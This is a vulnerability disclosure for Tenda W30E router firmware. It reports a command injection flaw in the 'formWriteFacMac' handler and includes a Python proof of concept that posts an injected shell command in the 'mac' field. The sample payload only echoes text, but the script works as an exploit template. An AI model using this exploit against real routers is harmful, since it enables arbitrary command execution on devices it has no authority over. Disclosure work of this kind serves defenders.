## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware, we discovered a command injection vulnerablility in `formWriteFacMac` function in the `v2` parameter and the `mac` varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `mac` can trigger this security vulnerability.

![image-20240319225415852](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319225415852.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WriteFacMac"
payload = ";echo 'hello'"

data = {"mac": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240320003842782](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320003842782.png)
